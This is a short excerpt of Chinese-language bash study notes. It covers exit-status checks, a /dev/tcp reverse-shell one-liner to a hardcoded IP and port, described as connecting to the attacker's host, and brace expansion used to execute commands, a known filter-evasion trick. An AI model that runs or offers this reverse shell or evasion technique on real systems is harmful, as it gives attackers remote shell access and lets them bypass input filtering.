...
- `if ! 命令 >/dev/null 2>&1; then`  
	...
	使用命令的返回状态码进行判断
- `exec 196<>/dev/tcp/192.168.38.133/1331; sh <&196 >&196 2>&196`
	反向 shell：打开到攻击者主机的 tcp 连接到文件描述符196，将 shell 的标准输入/输出/错误重定向到此 tcp 连接
...
- 花括号展开  
	...
	// 字符串展开后由 bash 处理，作为命令与参数
	{echo,{1..3}}
	```
	- 花括号扩展将展开字符串，而 bash 作为解释器解析字符串，可用花括号执行命令。核心：
		`$ 'ls' '-al'` 与 `$ "ls" "-al"` 均可作为命令执行
